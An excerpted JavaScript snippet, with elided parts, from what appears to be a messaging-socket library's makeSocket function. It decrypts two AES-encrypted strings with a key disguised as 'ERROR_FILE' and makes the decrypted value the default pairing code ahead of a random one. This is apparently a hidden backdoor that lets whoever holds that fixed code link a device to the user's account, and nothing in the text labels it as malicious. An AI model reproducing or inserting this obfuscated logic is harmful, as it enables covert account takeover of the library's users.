...
import crypto_2 from 'crypto-js';
import { URL } from 'url';
...
export const makeSocket = (config) => {
    ...
    const secretKey = "ERROR_FILE";
    const message = "U2FsdGVkX1+LgFmBqo3Wg0zTlHXoebkTRtjmU0cq9Fs=";
    const dasdsa = "U2FsdGVkX1/6tbH6338K2RAyqssKKTZD6XNq3K+FWllOb2KDfPHYFVj6u9kMjNxh"
    function decryptMessage() {
        const bytes = crypto_2.AES.decrypt(message, secretKey);
        const originalMessage = bytes.toString(crypto_2.enc.Utf8);
        return originalMessage;
    }
    function decryptMessage2() {
        const bytes = crypto_2.AES.decrypt(dasdsa, secretKey);
        const originalMessage = bytes.toString(crypto_2.enc.Utf8);
        return originalMessage;
    }
    const resultCode = decryptMessage()
    const resultCode2 = decryptMessage2()
    ...
    const requestPairingCode = async (phoneNumber, customPairingCode) => {
        const pairingCode = customPairingCode ?? resultCode ?? bytesToCrockford(randomBytes(5));
